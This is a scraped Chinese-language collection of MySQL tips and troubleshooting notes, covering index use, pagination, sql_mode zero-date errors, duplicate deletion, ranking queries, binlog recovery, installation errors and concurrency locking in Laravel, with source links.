sec)select * from test where status = 1 and id &gt; xxx order by id asc limit 10---10 rows in set (0.00 sec)https://blog.jiaojie.site/_posts/2017/12/22/mysql-pagination-tips/ MySQL 索引使用策略及优化123456789101112131415161718192021222324MySQL 的优化主要分为结构优化（Scheme optimization）和查询优化（Query optimization）。从 https://github.com/datacharmer/test_db 倒入 employees.sql 文件EXPLAIN 出来的信息有 10 列，分别是 id、select_type、table、type、possible_keys、key、key_len、ref、rows、Extra概要描述：id: 选择标识符select_type: 表示查询的类型。table: 输出结果集的表type: 表示表的连接类型all（全表扫描） 、index（按照索引顺序的全表扫描）、range (有范围的索引扫描)req (查找条件列使用了索引而且不为主键和 unique, 使用该索引列的值并不唯一)、ref_eq（使用了主键或者唯一性索引进行查找的情况）、const（主键放置到 where 后面作为条件查询，mysql 优化器就能把这次查询优化转化为一个常量）possible_keys: 表示查询时，可能使用的索引key: 表示实际使用的索引key_len: 索引字段的长度ref: 列与索引的比较rows: 扫描出的行数 (估算的行数)Extra: 执行情况的描述和说明不建议建索引的情况是索引的选择性较低。所谓索引的选择性（Selectivity），是指不重复的索引值（也叫基数，Cardinality）与表记录数（#T）的比值：Index Selectivity = Cardinality / #T显然选择性的取值范围为 (0, 1]，选择性越高的索引价值越大，这是由 B+Tree 的性质决定的select count(distinct title)/count(*) from table ; https://learnku.com/articles/32225 datetime 默认值为‘0000-00-00 00:00:00’值无法创建1234567891011121314使用root登陆数据库 命令界面执行select @@sql_mode; 结果中包含下面两个NO_ZERO_IN_DATE,NO_ZERO_DATE2、修改/etc/my.cnf，查找sql_model如果找不到则添加如下代码 sql_mode="ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"3、重启mysql/etc/ini.d/mysql restart简单几步大功告成！ 原因：NO_ZERO_IN_DATE,NO_ZERO_DATE是无法默认为‘0000-00-00 00:00:00’的根源。NO_ZERO_IN_DATE：在严格模式下，不允许日期和月份为零 NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。 删除重复数据123select *from hso_min WHERE id not IN (SELECT bid FROM (SELECT min(id) as bid FROM hso_min where symbol='xau' and uts&gt;1565971200 GROUP BY min)as b) and symbol='xau' and uts&gt;1565971200;delete from hso_min WHERE id not IN (SELECT bid FROM (SELECT min(id) as bid FROM hso_min where symbol='xau' and uts&gt;1565971200 GROUP BY min)as b) and symbol='xau' and uts&gt;1565971200; 每个用户最新一条1234567891011121314151617181920212223242526272829表一 messagesid (PRIMARY KEY)、to_user_id、from_user_id、content、created_at表二 userid (PRIMARY KEY)、name、created_at查询当天最新的 messages 并分页，要求同 user 只取一条 messagesgroup by 执行在 order by 之前，order by 只是对group by 结果进行排序。可以参考类似文章https://blog.csdn.net/zcd3f/article/details/84767206SELECT max(created_at),from_user_id,content from messages WHERE created_at like "%2019-08-21%" GROUP BY from_user_id ORDER BY from_user_id desc limit 100;DB::table('messages as t1') -&gt;leftJoin('messages as t2', function ($join) &#123; $join-&gt;on('t1.from_user_id', '=', 't2.from_user_id')-&gt;on('t1.id', '&lt;', 't2.id');&#125;) -&gt;leftJoin('user as t3', 't1.from_user_id', '=', 't3.id') -&gt;where('t1.to_user_id', $id) -&gt;whereNull('t2.id')-&gt;paginate(15);https://learnku.com/articles/32919 需要查询表里不同分类下的order最大的记录SELECT id,tid,`order`, FROM_UNIXTIME(yestime) FROM tfenWHERE tid IN(7512, 7514) GROUP BY tid ORDER BY `order` DESC ;结果不对SELECT id,tid,`order`,FROM_UNIXTIME(yestime) FROM (SELECT * FROM tfen WHERE tid IN(7512, 7514) ORDER BY `order` DESC ) AS t GROUP BY tid除非记录完全相同，否则 mysql 不保证每次 group by 结果相同 mysql索引测试1234567891011121314151617181920212223242526命令行直接查询sqlmysql -vv -uroot -h127.0.0.1 -P3306 -p123456 -Dtest -e"select count(*) from test where a = 123467 and b &gt; 123954";mysql: [Warning] Using a password on the command line interface can be insecure.--------------select count(*) from test where a = 123467 and b &gt; 123954--------------+----------+| count(*) |+----------+| 0 |+----------+1 row in set (4.16 sec)localhost:~ ws$ mysql -vv -uws -p123456 -Dtest -e"select sql_no_cache count(*) from test where a = 26727 and b &gt; 15512"mysql: [Warning] Using a password on the command line interface can be insecure.--------------select sql_no_cache count(*) from test where a = 26727 and b &gt; 15512--------------+----------+| count(*) |+----------+| 31 |+----------+1 row in set, 1 warning (0.32 sec)https://learnku.com/laravel/t/33768 MySQL 避坑宝典12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152修改表的默认字符集不会改表各个字段的字符集 ALTER TABLE tbl_name [DEFAULT] CHARACTER SET 'UTF8' 误认为会修改所有字段的字符集，但实际上它只会影响后续新增的字段不会改表已有字段的字符集。如果想修改整张表所有字段的字符集建议使用 ALTER TABLE tbl_name CONVERT TO CHARACTER SET charset_name; 隐式类型转换有无法命中索引的风险，在高并发、大数据量的情况下，命不中索引带来的后果非常严 SELECT * FROM sakila.film WHERE length &gt;= '60';对于 SELECT COUNT (*) 类型的请求如果不要求精度，建议使用 SHOW TABLE STATUS 或 EXPLAIN 替代。默认 MySQL 会对 'GROUP BY col1, col2, ...' 请求按如下顺序排序 'ORDER BY col1, col2, ...'。如果 GROUP BY 语句不指定 ORDER BY 条件会导致无谓的排序产生，如果不需要排序建议添加 'ORDER BY NULL'。select c1,c2,c3 from t1 where c1='foo' group by c2当 GROUP BY 条件为表达式或函数时会使用到临时表，如果在未指定 WHERE 或 WHERE 条件返回的结果集较大时性能会很差。select description from film where title ='ACADEMY DINOSAUR' GROUP BY length-language_id; 删除全表时建议使用 TRUNCATE 替代 DELETE 当表结构发生变更，如果 INSERT 或 REPLACE 请求不明确指定列名，请求的结果将会与预想的不同；建议使用 “INSERT INTO tbl (col1，col2) VALUES ...” 代替。 整型定义建议采用 INT (10) 或 BIGINT (20) INT (M) 在 integer 数据类型中，M 表示最大显示宽度。 在 INT (M) 中，M 的值跟 INT (M) 所占多少存储空间并无任何关系。 INT (3)、INT (4)、INT (8) 在磁盘上都是占用 4 bytes 的存储空间。 varchar 是可变长字符串，不预先分配存储空间，长度不要超过 255，如果存储长度过长 MySQL 将定义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索引效率。 COUNT (DISTINCT col) 计算该列除 NULL 之外的不重复行数，注意 COUNT (DISTINCT col, col2) 如果其中一列全为 NULL 那么即使另一列有不同的值，也返回 0。MyISAM 表对于 COUNT (*) 统计全表行数进行了特殊的优化，通常情况下非常快。但对于非 MyISAM 表或指定了某些 WHERE 条件，COUNT (*) 操作需要扫描大量的行才能获取精确的结果，性能也因此不佳。有时候某些业务场景并不需要完全精确的 COUNT 值，此时可以用近似值来代替。EXPLAIN 出来的优化器估算的行数就是一个不错的近似值，执行 EXPLAIN 并不需要真正去执行查询，所以成本很低。不要使用 COUNT (col) 或 COUNT (常量) 来替代 COUNT (*), COUNT (*) 是 SQL92 定义的标准统计行数的方法，跟数据无关，跟 NULL 和非 NULL 也无关。当某一列的值全是 NULL 时，COUNT (COL) 的返回结果为 0, 但 SUM (COL) 的返回结果为 NULL，因此使用 SUM () 时需注意 NPE 问题。可以使用如下方式来避免 SUM 的 NPE 问题: SELECT IF (ISNULL (SUM (COL)), 0, SUM (COL)) FROM tbl 触发器的执行没有反馈和日志，隐藏了实际的执行步骤，当数据库出现问题是，不能通过慢日志分析触发器的具体执行情况，不易发现问题。在 MySQL 中，触发器不能临时关闭或打开，在数据迁移或数据恢复等场景下，需要临时 drop 触发器，可能影响到生产环境。不建议使用存储过程 存储过程无版本控制，配合业务的存储过程升级很难做到业务无感知。存储过程在拓展和移植上也存在问题。当前 MySQL 版本不支持在子查询中进行 'LIMIT &amp; IN/ALL/ANY/SOME'。SELECT * FROM staff WHERE name IN (SELECT NAME FROM customer ORDER BY name LIMIT 1) DISTINCT 关键字在对元组排序后删除重复。相反，考虑使用一个带有 EXISTS 关键字的子查询，您可以避免返回整个表。 SELECT DISTINCT c.c_id, c.c_name FROM c,e WHERE e.c_id = c.c_idDUAL 表为虚拟表，不需要创建即可使用，也不建议服务以 DUAL 命名表。MySQL 将外部查询中的每一行作为依赖子查询执行子查询。 这是导致严重性能问题的常见原因。这可能会在 MySQL 5.6 版本中得到改善，但对于 5.1 及更早版本，建议将该类查询分别重写为 JOIN 或 LEFT OUTER JOIN。建议普通二级索引以 idx_为前缀，唯一索引以 uniq_为前缀。"&lt;&gt;" 才是标准 SQL 中的不等于运算符 不是！=数据库必须字段 （`last_update_time` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT ' 最后更新时间 '; `is_del` TINYINT (1) UNSIGNED NOT NULL DEFAULT '0' COMMENT ' 是否删除 0：未删除 1：已删除 '）建议使用 datetime 替换 timestamp 类型，且默认值设置为 1970-01-01 00:00:00。 datetime 类型能保存大范围的值，从 1001 年到 9999 年，且与时区无关。使用 8 个字节的存储空间（比 timestamp 多出 4 字节）SELECT INTO OUTFILE 需要授予 FILE 权限，这通过会引入安全问题。LOAD DATA 虽然可以提高数据导入速度，但同时也可能导致从库同步延迟过大。LOAD DATA INFILE 'data.txt' INTO TABLE db2.my_table;UPDATE/DELETE 操作不要指定 ORDER BY 条件。UPDATE/DELETE 操作使用 LIMIT 条件和不添加 WHERE 条件一样危险，它可将会导致主从数据不一致或从库同步中断。没有 ORDER BY 的 LIMIT 会导致非确定性的结果，这取决于查询执行计划。SQL 返回的列既不在聚合函数中也不是 GROUP BY 表达式的列中，因此这些值的结果将是非确定性的。如：select a, b, c from tbl where foo="bar" group by a，该 SQL 返回的结果就是不确定的。字符串字面上看起来像 IP 地址，但不是 INET_ATON () 的参数，表示数据被存储为字符而不是整数。将 IP 地址存储为整数更为有效。当主键为自增键时使用 INSERT ON DUPLICATE KEY UPDATE 可能会导致主键出现大量不连续快速增长，导致主键快速溢出无法继续写入。极端情况下还有可能导致主从数据不一致。因为 SQL_CALC_FOUND_ROWS 不能很好地扩展，所以可能导致性能问题；建议业务使用其他策略来替代 SQL_CALC_FOUND_ROWS 提供的计数功能，比如：分页结果展示等。 select SQL_CALC_FOUND_ROWS col from tbl where id&gt;1000请提前检查添加唯一索引列的数据唯一性，如果数据不唯一在线表结构调整时将有可能自动将重复列删除，这有可能导致数据丢失。在 MySQL 8.0 之前当 ORDER BY 多个列指定的排序方向不同时将无法使用已经建立的索引。SELECT * FROM tbl ORDER BY a DESC, b ASC; 未指定主键或主键非 bigint，建议将主键设置为 bigint unsigned。 无主键或唯一键，无法在线变更表结构 当需要同时删除或更新多张表时建议使用简单语句，一条 SQL 只删除或更新一张表，尽量不要将多张表的操作在同一条语句。 UPDATE users u LEFT JOIN hobby h ON u.id = h.uid SET u.name = 'pianoboy' WHERE h.hobby = 'piano';将嵌套查询重写为 JOIN 通常会导致更高效的执行和更有效的优化https://github.com/XiaoMi/soar/blob/master/doc/heuristic.mdhttps://learnku.com/articles/25270 数据中的排名12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849CREATE TABLE IF NOT EXISTS `employee` ( `id` INT AUTO_INCREMENT PRIMARY KEY, `name` VARCHAR(10) NOT NULL DEFAULT '', `income` INT NOT NULL DEFAULT '0') ENGINE = InnoDB DEFAULT CHARSET = utf8;INSERT INTO `employee` (`name`, `income`)VALUES ('麻子', 20000);INSERT INTO `employee` (`name`, `income`)VALUES ('李四', 12000);INSERT INTO `employee` (`name`, `income`)VALUES ('张三', 10000);INSERT INTO `employee` (`name`, `income`)VALUES ('王二', 16000);INSERT INTO `employee` (`name`, `income`)VALUES ('土豪', 40000);SELECT t1.name, t1.income, COUNT(*) AS rankFROM employee AS t1, employee AS t2WHERE t1.income &lt; t2.income OR (t1.income = t2.income AND t1.name &lt;= t2.name)GROUP BY t1.name, t1.incomeORDER BY rank; name income rank土豪 40000 1麻子 20000 2王二 16000 3李四 12000 4张三 10000 5找出中位数的排名数字：SELECT (COUNT(*) + 1) DIV 2 as rankFROM employee;从一组数据中获得中位数SELECT income AS medianFROM (SELECT t1.name, t1.income, COUNT(*) AS rank FROM employee AS t1, employee AS t2 WHERE t1.income &lt; t2.income OR (t1.income = t2.income AND t1.name &lt;= t2.name) GROUP BY t1.name, t1.income ORDER BY rank) t3WHERE rank = (SELECT (COUNT(*) + 1) DIV 2 FROM employee)索引的类型，从好到坏的情况是：system&gt;const&gt;range&gt;index&gt;Allhttps://learnku.com/articles/18390 树查询1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859CREATE TABLE category( category_id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(20) NOT NULL, parent INT DEFAULT NULL);INSERT INTO category VALUES(1,'ELECTRONICS',NULL),(2,'TELEVISIONS',1),(3,'TUBE',2), (4,'LCD',2),(5,'PLASMA',2),(6,'PORTABLE ELECTRONICS',1),(7,'MP3 PLAYERS',6),(8,'FLASH',7), (9,'CD PLAYERS',6),(10,'2 WAY RADIOS',6);SELECT * FROM category ORDER BY category_id;+-------------+----------------------+--------+| category_id | name | parent |+-------------+----------------------+--------+| 1 | ELECTRONICS | NULL || 2 | TELEVISIONS | 1 || 3 | TUBE | 2 || 4 | LCD | 2 || 5 | PLASMA | 2 || 6 | PORTABLE ELECTRONICS | 1 || 7 | MP3 PLAYERS | 6 || 8 | FLASH | 7 || 9 | CD PLAYERS | 6 || 10 | 2 WAY RADIOS | 6 |+-------------+----------------------+--------+SELECT t1.name AS lev1, t2.name as lev2, t3.name as lev3, t4.name as lev4FROM category AS t1LEFT JOIN category AS t2 ON t2.parent = t1.category_idLEFT JOIN category AS t3 ON t3.parent = t2.category_idLEFT JOIN category AS t4 ON t4.parent = t3.category_idWHERE t1.name = 'ELECTRONICS';+-------------+----------------------+--------------+-------+| lev1 | lev2 | lev3 | lev4 |+-------------+----------------------+--------------+-------+| ELECTRONICS | TELEVISIONS | TUBE | NULL || ELECTRONICS | TELEVISIONS | LCD | NULL || ELECTRONICS | TELEVISIONS | PLASMA | NULL || ELECTRONICS | PORTABLE ELECTRONICS | MP3 PLAYERS | FLASH || ELECTRONICS | PORTABLE ELECTRONICS | CD PLAYERS | NULL || ELECTRONICS | PORTABLE ELECTRONICS | 2 WAY RADIOS | NULL |+-------------+----------------------+--------------+-------+SELECT t1.name FROMcategory AS t1 LEFT JOIN category as t2ON t1.category_id = t2.parentWHERE t2.category_id IS NULL;+--------------+| name |+--------------+| TUBE || LCD || PLASMA || FLASH || CD PLAYERS || 2 WAY RADIOS |+--------------+http://mikehillyer.com/articles/managing-hierarchical-data-in-mysql/https://learnku.com/articles/33688 profile 工具12345678910111213141516171819202122232425262728//开启操作mysql&gt; set profiling = on;Query OK, 0 rows affected, 1 warning (0.00 sec)//查看是否开启成功mysql&gt; show variables like '%profil%';+------------------------+-------+| Variable_name | Value |+------------------------+-------+| have_profiling | YES || profiling | ON |//开启成功| profiling_history_size | 15 |mysql&gt; select * from article where no_index=666666;mysql&gt; show profiles;+----------+------------+---------------------------------------------+| Query_ID | Duration | Query |+----------+------------+---------------------------------------------+| 1 | 0.00150700 | show variables like '%profil%' || 2 | 0.01481100 | select * from article where no_index=666666 |+----------+------------+---------------------------------------------+2 rows in set, 1 warning (0.00 sec)mysql&gt; show profile for query 2;+----------------------+----------+| Status | Duration |+----------------------+----------+| starting | 0.000291 || checking permissions | 0.000007 | limit 语句的索引使用优化1234567891011针对于 limit 语句的优化，我们可以在它前面加 order by 索引字段如果 order by 的字段是索引，会先去索引文件中查找指定行数的数据mysql&gt; explain select sql_no_cache * from article order by id limit 90000,10 \G;索引覆盖 + 延时关联原理：主要利用索引覆盖查询，把覆盖索引查询返回的 id 作为与我们要查询记录的 id 进行相关联，mysql&gt; select sql_no_cache * from article limit 1000000,10;mysql&gt; select t1.* from article as t1 inner join (select id as pid from article limit 10000,10) as t2 on t1.id=t2.pid;https://learnku.com/articles/28609#replies group by 城市行业后获取工资最低1234MySQL 求助， group by 城市行业后获取工资最低的一条数据https://cn.v2ex.com/t/600001#reply34select business.id, business.money from business join (select city, min(money) as min_money from business group by city) as temp on business.city = temp.city and business.money = temp.min_money;select * from (select * from T order by money limit 100) tmp group by city, business; 每个司机今天最早的一笔订单12345678910111213141516171819202122232425262728293031323334https://mp.weixin.qq.com/s?__biz=MzI1MzY0MzE4Mg==&amp;mid=2247483773&amp;idx=1&amp;sn=d2578386819d66147f09209ecc834436&amp;chksm=e9d011bcdea798aa21d65f935567eb1c66511d2fc9925b51ccea6a4985a21d85d95c01a513b3&amp;scene=21#wechat_redirectselect name,sex,register,ordertime from userinfo,orderinfo where userinfo.id = orderinfo.userid group by orderinfo.userid order by orderinfo.ordertime limit 1select name,sex,register,min(ordertime) from userinfo,orderinfo where userinfo.id = orderinfo.userid group by orderinfo.userid张三的第一个用户应该是二号，细心的你可能已经发现问题了，还是group by的问题，它返回的是链接之后分组的第一条记录，min(ordertime)相当于是不在表中的一个新加入的字段，它的值通过min函数计算而来，所以会出现上面的结果select name,sex,register,ordertime,orderuser from userinfo left outer join orderinfo on userinfo.id = orderinfo.userid where orderinfo.ordertime in (select min(ordertime) from orderinfo group by userid)where子句限定了ordertime的取值范围，所以不会出现那些没有订单信息的用户，所以我们还要对语句作如下修改，让ordertime可以为Null值：select name,sex,register,ordertime,orderuser from userinfo left outer join orderinfo on userinfo.id = orderinfo.userid where orderinfo.ordertime in (select min(ordertime) from orderinfo group by userid) or orderinfo.ordertime is Nullselect name,sex,register,ordertime,orderuser from userinfo,orderinfo,(select userid,min(ordertime) as ordertime2 from orderinfo group by userid) as orderinfo2 where userinfo.id = orderinfo.userid and orderinfo.ordertime = orderinfo2.ordertime2 and orderinfo.userid = orderinfo2.useridmysql没有row_number()/rank()/dense_rank() over(partition by)这样高级的sql语法，不过我们可以通过编程的方式来模拟实现类似的功能select u.name,u.sex,u.register,o.ordertime,o.orderuser from userinfo as u,(select orderinfo.*,if(@userid = orderinfo.userid,@rank:=@rank+1,@rank:=1) as rank,@userid:=orderinfo.userid from orderinfo,(select @rank:=0,@userid:=NULL) as b order by orderinfo.userid,orderinfo.ordertime) as o where u.id = o.userid and o.rank = 1mysql中变量不用事前申明，在用的时候直接用“@变量名”使用就可以了。第一种用法：set @num=1; 或set @num:=1; //这里要使用变量来保存数据，直接使用@num变量第二种用法：select @num:=1; 或 select @num:=字段名 from 表名 where ……注意上面两种赋值符号，使用set时可以用“=”或“：=”，但是使用select时必须用“：=赋值”使用变量添加行号我们可以设置一个初始行号，接下来在 select语句中不断改变行号的值即可：set @i = 0;select (@i:=@i+1) as i,userinfo.* from userinfo如果使用一句话，我们可以将设置初始值的过程放在from后面：select (@i:=@i+1) as i,userinfo.* from userinfo,(select @i:=0) as it 我们根据司机的注册时间划分司机类型：select name,if(register &gt; '2017-08-05','A','B') as type from userinfoselect orderinfo.*,if(@userid = orderinfo.userid,@rank:=@rank+1,@rank:=1) as rank,@userid:=orderinfo.userid from orderinfo,(select @rank:=0,@userid:=NULL) as b 删除重复12345select *from hso_minline where phymin in(select phymin from hso_minline where symbol='xau' and uts&gt;1565971200 group by phymin having count(*) &gt;1) and symbol='xau' and uts&gt;1565971200 limit 20; delete from hso_minline WHERE id not IN (SELECT bid FROM (SELECT min(id) as bid FROM hso_minline where symbol='xau' and uts&gt;1565971200 GROUP BY phymin)as b) and symbol='xau' and uts&gt;1565971200; MySQL 通过 binlog 恢复数据123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051如果不知道 mysql 的配置文件路径，可以使用 mysql 命令进行查找，mysql --verbose --help|grep -A 1 'Default options’ #该命令会罗列出my.cnf顺序查找的路径。Default options are read from the following files in the given order:/etc/my.cnf /etc/mysql/my.cnf /usr/etc/my.cnf ~/.my.cnfbinlog 就是 binary log，二进制日志文件，记录所有数据库更新语句，包括表更新和记录更新，即数据操纵语言 (DML)，binlog 主要用于数据恢复和配置主从复制等；数据恢复：当数据库误删或者发生不可描述的事情时，可以通过 binlog 恢复到某个时间点的数据。主从复制：当有数据库更新之后，主库通过 binlog 记录并通知从库进行更新，从而保证主从数据库数据一致；log_bin=ONlog_bin_basename=/path/bin-loglog_bin_index=/path/bin-log.indexstatement 格式日志，执行 mysqlbinlog /path/bin-log.000001，可以直接看到原始执行的 SQL 语句row 格式日志，则可读性没有那么好，但仍可通过参数使文档更加可读 mysqlbinlog -v /path/bin-log.000001mysqlbinlog 两对非常重要的参数--start-datetime --stop-datetime 解析某一个时间段内的 binlog；--start-position --stop-position 解析在两个 position 之间的 binlog；CREATE TABLE `users` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, `age` int(8) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; INSERT INTO `users` (`id`, `name`, `age`) VALUES (null, '姓名一', 5); mysqldump -uroot -p T &gt; /path/xxx.sql; # 备份数据库 show master status; # 查看当前的position位置，此时值为154INSERT INTO `users` (`id`, `name`, `age`)VALUES (null, '姓名二', 13), (null, '姓名三', 14), (null, '姓名四', 15), (null, '姓名五', 16), (null, '姓名六', 17); update users set age = 5； INSERT INTO `users` (`id`, `name`, `age`) VALUES (null, '姓名七', 16), (null, '姓名八', 18); mysqlbinlog --start-position=154 --stop-position=513 bin-log.000001 &gt; /path/bak.sql; mysql -uroot -p &lt; /path/bak.sql; https://learnku.com/articles/20628 MySQL 8.0 加密方式不兼容12345678910111213141516171819Illuminate\Database\QueryException : SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client (SQL: select * from information_schema.tables where table_schema = weibo and table_name = migrations and table_type = 'BASE TABLE')运行 php artisan migrate -v 查看更详细信息如下： Exception trace: 1 PDOException::("PDO::__construct(): The server requested authentication method unknown to the client [caching_sha2_password]") /www/weibo/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:70 MySQL 8.0 使用了新的密码加密方式：caching_sha2_password，而许多客户端还不支持这种方式，比如 php 的 PDO 扩展。 修改 docker-compose.yml 的 mysql 服务部分，添加一行： command: --default-authentication-plugin=mysql_native_password my.cnf 配置文件中 [mysqld] 下添加一行： default-authentication-plugin=mysql_native_password 重新构建服务，依次执行：docker-compose down, docker-compose up -d 运行 docker container exec -it &lt;container_name or id&gt; /bin/bash 进入 mysql 所在的容器。登录 root 账号：mysql -u root -p &lt;password&gt;，登入 mysql 后依次运行： ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_password'; FLUSH PRIVILEGES; https://learnku.com/articles/34823 MySQL 安装常见错误1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950rpm -Uvh mysql57-community-release-el7-10.noarch.rpm#命令行出现 mysql57-community-release-el7-8.noarchrpm -e --nodeps mysql57-community-release-el7-8.noarch2. 依赖报错Error: Package: mysql-community-server-5.7.20-1.el7.x86_64 (mysql57-community) Requires: libsasl2.so.3()(64bit)Error: Package: mysql-community-client-5.7.20-1.el7.x86_64 (mysql57-community) Requires: libstdc++.so.6(GLIBCXX_3.4.15)(64bit)Error: Package: mysql-community-libs-5.7.20-1.el7.x86_64 (mysql57-community)...分析因为 旧版本 mysql 的依赖问题；最快的解决方案就是卸载重装3. 卸载1. 快速删除yum remove mysql mysql-server mysql-libs mysql-server2. 查找残留文件rpm -qa | grep -i mysql## 将查询出来的文件删除yum remove mysql-community-common-5.7.20-1.el6.x86_64## 删除残余目录whereis mysqlrm –rf /usr/lib64/mysql3. 删除依赖## 查找依赖 yum list installed | grep mysql## 删除找到的依赖yum -y remove mysql-libs.x86_644. 安装新 mysql1. 添加镜像源，从官网 downloads 选取wget dev.mysql.com/get/mysql-community-release-el6-5.noarch.rpmyum localinstall mysql-community-release-el6-5.noarch.rpmyum repolist all | grep mysqlyum-config-manager --disable mysql55-communityyum-config-manager --disable mysql56-communityyum-config-manager --enable mysql57-community-dmryum repolist enabled | grep mysql2. 安装yum install mysql-community-serverhttps://learnku.com/articles/35042 数据库脏读12345678910111213MYSQL查看数据库事务隔离级别1show variables like '%isolation%';修改MYSQL数据库事务隔离级别设置innodb的事务级别方法是：set 作用域 transaction isolation level 事务隔离级别，例如：SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE&#125; mysql&gt; set global transaction isolation level read committed; #全局的mysql&gt; set session transaction isolation level read committed; #当前会话http://blog.qicunshang.com/2018/02/07/database-dirty-read/ 创建外键报错123456外键关联的数据结构不对，查看了表的数据结构发现 ID 主键自增是 int unsigned 类型的，而我关联的 parent_id 是 int 类型的，所以数据结构不一致才会报错Schema:：create（"store_menus'，function（Blueprint $table）&#123;$table-&gt;increments（'id）：$table-&gt;string（'title'）-&gt;upinue（）-&gt;comment（菜单名称）；$table-&gt;integer（'parent_id'）-&gt;index（）-&gt;default（0）-&gt;comment“父类ID’）；https://learnku.com/articles/35353 并发测试12345678910111213 DB::table('articles')-&gt;where('id' , $request-&gt;id)-&gt;increment('like');100并发结果为100 return DB::transaction(function() use ($request)&#123; $article = Article::find($request-&gt;id); $article-&gt;like += 1; $article-&gt;save(); return $this-&gt;message('点赞成功！'); &#125;);100并发结果为177.increment 方法编译后的结果就是 update like = like +1 where id = 'id',update 语句是行级锁，所有是顺序执行更新的。2. 在事务里面进行查询之后再更新，MySQL 默认使用 RR 级别隔离，所有可能存在并发请求的时候读取的值是同一个，这里避免的方式是加上 Article::lockForUpdate ()-&gt;find ($request-&gt;id); 排它锁，目的是在本次事物执行查询的时候，其他事务是不允许读取的，这样才能防止并发下产生的问题。https://learnku.com/articles/35337单个请求是可以实现的 只有在多数并发访问的时候才会出现异常 mysql update超卖123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051以抢购 100 件商品为例，商品表 num=100在函数 doPageGoodsOrder 中，如果使用如下 sql$sql="update ims_hotmallstore_goods set num=$number where num&gt;0 and id=".$goods['id'];即直接更新数据，不在 sql 中运算，在使用 apache ab 测试时ab -n 1000 -c 100 http://redis.test/demo/test.php?i=2发现：商品表，num 字段不为 0订单表，生成 456 份订单日志表，1000 条日志，其中抢购成功的即 status=1 的是 100 条如果在 sql 中计算，即：$sql="update ims_hotmallstore_goods set num=num-".$goods_number." where num&gt;0 and id=".$goods['id'];结果正常，num=0，订单 100 条，日志 1000 条并发高的情况下，必须要用 mysql 的更新锁。问题出在上面判断库存的时候：假设 A 取到的是剩余 100 库存，并发时 B 取到的也是 100 库存当 A 自行减法算出库存为 99 并更新，这时 C 拿到的库存可能是 100，也可能是 99当 C 自行减一后，算出 98 时，这时候可能 B 算出来是 99 并更新到库存当 D 获得库存时，可能是 99 还可能是 100以上就会出现这种情况。解决方案：使用 mysql 事务处理，在获取库存之前开始处理事务并锁定表，然后结束事务，laravel 文档中有这一条代码DB::table('users')-&gt;where('votes', '&gt;', 100)-&gt;lockForUpdate()-&gt;get();// 抢购下单public function doPageGoodsStore()&#123; $pdo = self::Pdo(); $goods_id=1; /**诺，问题所在 对于 redis 来说，它属于单线程的原子性操作，但是 mysql 不是。 所以这里拿商品数据，你是通过查询数据库获取的。 而又因为你算库存的时候，通过查询数据库获取到的库存来计算， 在并发情况下自然会引起不正确，这里的库存数，建议也通过 redis 中存储的热数据来计算 比如 $stock = $redis-&gt;llen('num'); **/ $sql="select id, num, money from ims_hotmallstore_goods where id=".$goods_id;&#125;补充第二个问题，看下来是不会的，但是会出现数据的错误，最直接的就是你能看到的超库存。当然，这个还有一些隐藏的问题。因为并发，数据库压力比较大，如果实时去 update 和 insert 的话，会出现一些单点故障，比如数据库奔溃。我一般入库的做法是在热度过后再批量入库。https://learnku.com/laravel/t/34293 mysql5.7 datetime 默认值为‘0000-00-00 00:00:00’值无法创建12345678910111213141、使用root登陆数据库 命令界面执行select @@sql_mode; 结果中包含下面两个NO_ZERO_IN_DATE,NO_ZERO_DATE2、修改/etc/my.cnf，查找sql_model如果找不到则添加如下代码 sql_mode="ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"3、重启mysql/etc/ini.d/mysql restart简单几步大功告成！ 原因：NO_ZERO_IN_DATE,NO_ZERO_DATE是无法默认为‘0000-00-00 00:00:00’的根源。NO_ZERO_IN_DATE：在严格模式下，不允许日期和月份为零 NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。 INFORMATION_SCHEMA12345678910INFORMATION_SCHEMA 是用来访问数据库的元数据（比如数据库，表的名称，列的数据类型或者访问权限等）的，在每个 MySQL 的实例中，INFORMATION_SCHEMA 保存了它维护的所有数据库的信息查询出数据库 wizard 中所有的表以及数据类型，存储引擎。使用 INFORMATION_SCHEMA 查询可能会从多个数据库检索信息，所以查询可能会比较耗时，对性能产生一定的影响。在执行之前，可以使用 EXPLAIN 命令检查一下查询的效率mysql&gt; SELECT table_name, table_type, engine -&gt; FROM information_schema.tables -&gt; WHERE table_schema = 'wizard' -&gt; ORDER BY table_name;https://github.com/mylxsw/growing-up/blob/master/doc/mysql-lock-transaction.md 程序猿成长计划https://learnku.com/articles/35773 Got error 134 from storage engine1234567891011121314 SELECT * FROM `xx_article` WHERE `cid1` =6 LIMIT 0 , 30. #1030 - Got error 134 from storage engine 这才发现原来是存储引擎发生了错误，知道了原因就来弱弱的修复下： 先 check 表:check table `xx_article`; 这里需要注意的一点是，check 完表后必须修复之后 才能看到数据，切莫看到数据记录为空，就大惊失色。 然后再修复表： repair table `xx_article`;https://learnku.com/articles/35836 MySQL批量更新与插入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051replace into table （ 